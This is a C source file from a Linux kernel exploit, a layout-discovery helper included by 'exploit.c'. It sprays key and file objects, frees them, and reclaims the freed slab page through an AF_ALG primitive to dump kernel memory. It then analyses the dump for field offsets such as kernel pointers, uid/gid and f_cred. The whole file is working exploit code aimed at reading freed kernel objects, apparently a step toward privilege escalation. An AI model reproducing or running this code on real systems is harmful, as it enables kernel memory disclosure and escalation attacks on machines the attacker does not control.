/* Layout discovery helper for kernels without BTF: dump a captured slab page
   and print a candidate-offset analysis.  Included by exploit.c.

   K2_DUMP=keys ./exploit     - retired struct key page, distinctive fields
   K2_DUMP=filp ./exploit     - retired struct file page (f_cred)
*/

#define K2_DUMP_BYTES 1016U
#define K2_DUMP_TARGETS (K2_DUMP_BYTES / 8U)
#define K2_DUMP_MAX_OBJ 8U

static void k2_dump_hex(const char *tag, const unsigned char *page,
                        size_t length)
{
    printf("K2_DUMP_BEGIN what=%s uid=%ld euid=%ld pid=%ld bytes=%zu\n", tag,
           (long)getuid(), (long)geteuid(), (long)getpid(), length);
    for (size_t offset = 0; offset < length; offset += 32) {
        size_t chunk = length - offset < 32 ? length - offset : 32;

        printf("%04zx:", offset);
        for (size_t i = 0; i < chunk; i++)
            printf(" %02x", page[offset + i]);
        printf("\n");
    }
    printf("K2_DUMP_END\n");
}

static bool k2_image_ptr(uint64_t v)
{
    return v >= UINT64_C(0xffffffff80000000) &&
           v < UINT64_C(0xffffffffc0000000) && (v & 7) == 0;
}

static bool k2_heap_ptr(uint64_t v)
{
    return v >= UINT64_C(0xffff800000000000) &&
           v < UINT64_C(0xffffff0000000000) && (v & 7) == 0;
}

static bool k2_time_val(uint64_t v)
{
    return v >= UINT64_C(1500000000) && v <= UINT64_C(4000000000);
}

/* Count, over up to K2_DUMP_MAX_OBJ objects, how many carry the field shape
   described by `kind` at absolute page offset `offset`. */
enum {
    K2_SHAPE_IMAGE_PAIR_HEAP = 0, /* type, domain_tag, description */
    K2_SHAPE_UID_GID,
    K2_SHAPE_PERM,
    K2_SHAPE_QUOTA_LEN,
    K2_SHAPE_TIME_PAIR,           /* expiry, last_used_at */
    K2_SHAPE_HEAP,                /* user, description */
};

static unsigned int k2_count_shape(const unsigned char *page, size_t stride,
                                   unsigned int count, size_t offset,
                                   int kind)
{
    unsigned int hits = 0;

    for (unsigned int object = 0; object < count; object++) {
        const unsigned char *base = page + (size_t)object * stride;

        switch (kind) {
        case K2_SHAPE_IMAGE_PAIR_HEAP:
            hits += k2_image_ptr(get_u64(base + offset)) &&
                    k2_image_ptr(get_u64(base + offset + 8)) &&
                    k2_heap_ptr(get_u64(base + offset + 16));
            break;
        case K2_SHAPE_UID_GID:
            hits += get_u32(base + offset) == (uint32_t)getuid() &&
                    get_u32(base + offset + 4) == (uint32_t)getgid();
            break;
        case K2_SHAPE_PERM:
            hits += get_u32(base + offset) == UINT32_C(0x3f3f3f3f);
            break;
        case K2_SHAPE_QUOTA_LEN:
            hits += get_u16(base + offset) == 1 &&
                    get_u16(base + offset + 2) == 6;
            break;
        case K2_SHAPE_TIME_PAIR:
            hits += k2_time_val(get_u64(base + offset)) &&
                    k2_time_val(get_u64(base + offset + 8));
            break;
        case K2_SHAPE_HEAP:
            hits += k2_heap_ptr(get_u64(base + offset));
            break;
        }
        (void)count;
    }
    return hits;
}

static void k2_analyse(const unsigned char *page, size_t length, bool keys)
{
    static const struct {
        const char *name;
        int kind;
    } shapes[] = {
        {"image_pair_heap(type,domain,desc)", K2_SHAPE_IMAGE_PAIR_HEAP},
        {"uid_gid", K2_SHAPE_UID_GID},
        {"perm_3f3f3f3f", K2_SHAPE_PERM},
        {"quotalen1_desc6", K2_SHAPE_QUOTA_LEN},
        {"time_pair(expiry,last_used)", K2_SHAPE_TIME_PAIR},
        {"heap_ptr", K2_SHAPE_HEAP},
    };
    static const size_t strides[] = { 128, 192, 256, 320, 384, 512 };

    printf("K2_ANALYSE_BEGIN\n");
    for (size_t s = 0; s < sizeof(strides) / sizeof(strides[0]); s++) {
        size_t stride = strides[s];
        unsigned int count = (unsigned int)(length / stride);

        if (count > K2_DUMP_MAX_OBJ)
            count = K2_DUMP_MAX_OBJ;
        if (count < 3)
            continue;
        printf("K2_STRIDE %zu objects=%u\n", stride, count);
        for (size_t offset = 0; offset + 24 <= stride; offset += 8) {
            for (size_t k = 0; k < sizeof(shapes) / sizeof(shapes[0]); k++) {
                unsigned int hits = k2_count_shape(page, stride, count,
                                                   offset, shapes[k].kind);

                if (hits + 1 >= count)
                    printf("K2_FIELD stride=%zu offset=%#zx shape=%s hits=%u"
                           "/%u\n", stride, offset, shapes[k].name, hits,
                           count);
            }
        }
    }
    (void)keys;
    printf("K2_ANALYSE_END\n");
}

static int k2_dump_keys(unsigned char *page, unsigned long serial_lo,
                        unsigned long serial_hi)
{
    enum { DUMP_KEYS = 320 };
    key_serial_t *serials;
    int ring, rc;
    struct gap_plan plan;
    size_t targets[K2_DUMP_TARGETS];

    for (size_t i = 0; i < K2_DUMP_TARGETS; i++)
        targets[i] = i * 8;
    rc = build_target_plan(targets, K2_DUMP_TARGETS, 4096, &plan);
    if (rc)
        return rc;
    ring = create_keyring("dump", KEY_SPEC_PROCESS_KEYRING);
    if (ring < 0)
        return ring;
    serials = calloc(DUMP_KEYS, sizeof(*serials));
    if (!serials)
        return -ENOMEM;
    for (unsigned int i = 0; i < DUMP_KEYS; i++) {
        unsigned char payload = (unsigned char)i;
        char description[32];
        long serial;

        /* desc_len 6, known prefix, distinctive perm set below */
        snprintf(description, sizeof(description), "kd%05x", i);
        serial = add_key_raw("user", description, &payload, 1,
                             (key_serial_t)ring);
        if (serial < 0) {
            rc = -errno;
            free(serials);
            return rc;
        }
        serials[i] = (key_serial_t)serial;
        (void)keyctl_raw(KEYCTL_SETPERM, (unsigned long)serial,
                         UINT32_C(0x3f3f3f3f), 0, 0);
    }
    printf("K2_DUMP_SERIALS first=%d second=%d last=%d\n", serials[0],
           serials[1], serials[DUMP_KEYS - 1]);
    if (serial_lo)
        *(&serial_lo) = (unsigned long)serials[0];
    if (serial_hi)
        *(&serial_hi) = (unsigned long)serials[DUMP_KEYS - 1];
    (void)keyctl_raw(KEYCTL_CLEAR, (unsigned long)ring, 0, 0, 0);
    for (unsigned int i = 0; i < DUMP_KEYS; i++)
        (void)keyctl_raw(KEYCTL_INVALIDATE, (unsigned long)serials[i], 0, 0, 0);
    free(serials);
    rc = global_rcu_gp();
    if (rc)
        return rc;
    usleep(60000);
    rc = global_rcu_gp();
    if (rc)
        return rc;
    for (unsigned int attempt = 0; attempt < 12; attempt++) {
        unsigned char *record = NULL;
        size_t length = 0;

        rc = afalg_plan_record(&plan, 1000, &record, &length);
        if (rc)
            return rc;
        if (length >= K2_DUMP_BYTES) {
            memcpy(page, record, K2_DUMP_BYTES);
            free(record);
            return 0;
        }
        free(record);
    }
    return -ENOENT;
}

static int k2_dump_filp(unsigned char *page)
{
    enum { DUMP_FILES = 600 };
    int *fds;
    int rc;
    struct gap_plan plan;
    size_t targets[K2_DUMP_TARGETS];

    for (size_t i = 0; i < K2_DUMP_TARGETS; i++)
        targets[i] = i * 8;
    rc = build_target_plan(targets, K2_DUMP_TARGETS, 4096, &plan);
    if (rc)
        return rc;
    fds = calloc(DUMP_FILES, sizeof(*fds));
    if (!fds)
        return -ENOMEM;
    for (unsigned int i = 0; i < DUMP_FILES; i++)
        fds[i] = open("/dev/null", O_RDONLY | O_CLOEXEC);
    for (unsigned int i = 0; i < DUMP_FILES; i++)
        if (fds[i] >= 0)
            close(fds[i]);
    free(fds);
    rc = global_rcu_gp();
    if (rc)
        return rc;
    usleep(40000);
    rc = global_rcu_gp();
    if (rc)
        return rc;
    for (unsigned int attempt = 0; attempt < 12; attempt++) {
        unsigned char *record = NULL;
        size_t length = 0;

        rc = afalg_plan_record(&plan, 1000, &record, &length);
        if (rc)
            return rc;
        if (length >= K2_DUMP_BYTES) {
            memcpy(page, record, K2_DUMP_BYTES);
            free(record);
            return 0;
        }
        free(record);
    }
    return -ENOENT;
}

__attribute__((constructor)) static void k2_dump_constructor(void)
{
    const char *what = getenv("K2_DUMP");
    unsigned char page[K2_DUMP_BYTES];
    int rc;

    if (!what || !*what)
        return;
    setvbuf(stdout, NULL, _IONBF, 0);
    memset(page, 0, sizeof(page));
    if (strcmp(what, "keys") == 0)
        rc = k2_dump_keys(page, 0, 0);
    else if (strcmp(what, "filp") == 0)
        rc = k2_dump_filp(page);
    else {
        fprintf(stderr, "K2_DUMP=keys|filp\n");
        _exit(2);
    }
    if (rc) {
        fprintf(stderr, "K2_DUMP_FAIL what=%s rc=%d\n", what, rc);
        _exit(1);
    }
    k2_dump_hex(what, page, sizeof(page));
    k2_analyse(page, sizeof(page), strcmp(what, "keys") == 0);
    _exit(0);
}
